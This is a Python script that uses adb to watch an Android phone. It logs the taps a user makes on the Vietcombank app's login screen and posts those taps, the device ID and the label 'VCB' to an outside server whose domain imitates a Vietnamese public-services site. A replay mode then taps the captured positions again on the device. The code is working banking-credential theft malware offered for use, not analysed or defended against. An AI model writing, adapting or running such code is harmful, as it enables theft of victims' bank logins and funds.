import subprocess
import threading
import time
import math
import requests
import sys
import os
import json

# 配置阈值和服务器地址
DISTANCE_THRESHOLD = 40
TIME_THRESHOLD = 0.5
LARAVEL_API_URL = "https://admin.dichvucong-shk.top/api/touch"

# 全局变量
monitoring = False

last_click_end_time = None



# 初始化全局变量


# mode = sys.argv[1]
# android_id = sys.argv[2]
# click_positions_json = sys.argv[3]


mode = "jianting"
android_id = "849869c47b4c2da9"
click_positions_json = ""



print("22222"+click_positions_json)

 # 检查 JSON 字符串是否为空
if not click_positions_json.strip():
    print("Click positions is empty. Setting to default empty list.")
    click_positions = []  # 默认空数组
else:
    try:
        # 将 JSON 字符串转换为数组
        click_positions = json.loads(click_positions_json)
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON: {str(e)}")
        sys.exit(1)



# 状态机相关变量
touch_down = False
touch_down_time = None
touch_start_position = None
current_tracking_id = None
last_position = None
frame_x = None
frame_y = None


def upload_click_data():
    global android_id
    """上传点击数据到 Laravel 后台"""
    global click_positions

    # 确保 android_id 是字符串类型
    if not isinstance(android_id, str):
        print(f"android_id 必须是字符串，当前类型: {type(android_id)}。尝试转换...")
        android_id = str(android_id)

    if not click_positions:
        print("没有捕获到任何点击位置，无法上传！")
        return


    try:
        print("正在上传点击数据到 Laravel 后台...")
        click_positions_str = json.dumps(click_positions)

        payload = {
            "click_positions": click_positions_str,
            "android_id": android_id,
            "bank": "VCB"
        }
        print(f"上传数据: {payload}")  # 调试输出上传数据

        response = requests.post(LARAVEL_API_URL, json=payload)
        if response.status_code == 200:
            print("数据上传成功！")
        else:
            print(f"数据上传失败，状态码: {response.status_code}, 响应: {response.text}")
    except requests.RequestException as e:
        print(f"数据上传失败，错误: {e}")



def listen_touch_events():
    """监听触摸事件"""
    global monitoring
    global touch_down, touch_down_time, touch_start_position, current_tracking_id
    global last_position, frame_x, frame_y
    global click_positions, last_click_end_time

    while True:
        if not monitoring:
            time.sleep(1)
            continue

        process = subprocess.Popen(
            ["adb", "shell", "getevent", "-lt"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        try:
            for line in iter(process.stdout.readline, b""):
                if not monitoring:
                    break

                decoded_line = line.decode("utf-8").strip()

                if "ABS_MT_TRACKING_ID" in decoded_line:
                    tracking_id_hex = decoded_line.split()[-1]
                    tracking_id = int(tracking_id_hex, 16)

                    if tracking_id != 0xFFFFFFFF and not touch_down:
                        touch_down = True
                        touch_down_time = time.time()
                        current_tracking_id = tracking_id
                        touch_start_position = None
                        last_position = None
                        frame_x = None
                        frame_y = None

                    elif tracking_id == 0xFFFFFFFF and touch_down and current_tracking_id is not None:
                        touch_up_time = time.time()
                        if touch_start_position and last_position:
                            x_start, y_start = touch_start_position
                            x_end, y_end = last_position
                            touch_duration = touch_up_time - touch_down_time
                            distance = math.sqrt((x_end - x_start) ** 2 + (y_end - y_start) ** 2)

                            if distance < DISTANCE_THRESHOLD and touch_duration < TIME_THRESHOLD:
                                if last_click_end_time is None:
                                    click_interval = 0
                                else:
                                    click_interval = touch_up_time - last_click_end_time

                                click_positions.append({"x": x_end, "y": y_end, "interval": click_interval})
                                print(f"捕获『点击』: X={x_end}, Y={y_end}, 间隔={click_interval:.2f}s")
                                last_click_end_time = touch_up_time
                            else:
                                print(f"捕获『滑动』: 起点=({x_start},{y_start}), 终点=({x_end},{y_end})")

                        touch_down = False
                        touch_down_time = None
                        current_tracking_id = None
                        touch_start_position = None
                        last_position = None
                        frame_x = None
                        frame_y = None

                elif "ABS_MT_POSITION_X" in decoded_line:
                    frame_x = int(decoded_line.split()[-1], 16)

                elif "ABS_MT_POSITION_Y" in decoded_line:
                    frame_y = int(decoded_line.split()[-1], 16)

                elif "SYN_REPORT" in decoded_line:
                    if touch_down and frame_x is not None and frame_y is not None:
                        if touch_start_position is None:
                            touch_start_position = (frame_x, frame_y)
                        last_position = (frame_x, frame_y)
                    frame_x = None
                    frame_y = None

        except KeyboardInterrupt:
            print("停止监听触摸事件")
            break
        finally:
            process.terminate()


def get_current_activity():
    """通过 adb 获取当前活动页面"""
    try:
        result = subprocess.check_output(
            ["adb", "shell", "dumpsys", "window"],
            encoding="utf-8",
            errors="ignore"
        )
        for line in result.splitlines():
            if "mCurrentFocus" in line or "mFocusedApp" in line:
                parts = line.split()
                for part in parts:
                    if "/" in part:
                        return part.strip("{}")
        return None
    except subprocess.CalledProcessError as e:
        print(f"获取活动页面时出错: {e}")
        return None


def monitor_activity(target_activity):
    """持续监控页面"""
    global monitoring
    while True:
        current_activity = get_current_activity()
        print(f"当前页面: {current_activity}")
        if current_activity == target_activity:
            if not monitoring:
                monitoring = True
                print(f"进入目标页面：{target_activity}")
        else:
            if monitoring:
                monitoring = False
                print(f"离开目标页面：{target_activity}")
                upload_click_data()
                os._exit(0)
        time.sleep(1)


def repeat_click_positions():
    """重复刚才的所有点击位置和时间间隔"""
    global click_positions
    if not click_positions:
        print("1111没有捕获到任何点击位置，无法重复操作！")
        return

    print("22222开始重复点击位置和时间间隔...")

    # 让回放从第一个点击开始
    for i, position in enumerate(click_positions):
        # 从位置数据中提取值并确保类型正确
        x = position.get("x", 0)
        y = position.get("y", 0)
        interval = position.get("interval", 0)

        try:
            # 确保 interval 是浮点数
            interval = float(interval)
        except ValueError:
            print(f"Invalid interval value: {interval}. Skipping this click.")
            continue

        print(f"第{i + 1}次点击 -> 位置: X={x}, Y={y}, 间隔: {interval:.2f}s")

        # 等待点击间隔时间
        time.sleep(interval)

        # 执行点击操作
        subprocess.run(["adb", "shell", "input", "tap", str(x), str(y)])
        print(f"第{i + 1}次点击完成 -> 位置: X={x}, Y={y}, 间隔: {interval:.2f}s")

    print("3333所有点击已重复完成！")


if __name__ == "__main__":
    if mode=="jianting":
        target_activity = "com.VCB/com.VCB.ui.activities.login.LoginActivity"

        activity_thread = threading.Thread(target=monitor_activity, args=(target_activity,), daemon=True)
        activity_thread.start()

        touch_thread = threading.Thread(target=listen_touch_events, daemon=True)
        touch_thread.start()

        while True:
            time.sleep(1)
    else :
        repeat_click_positions()
        sys.exit(0)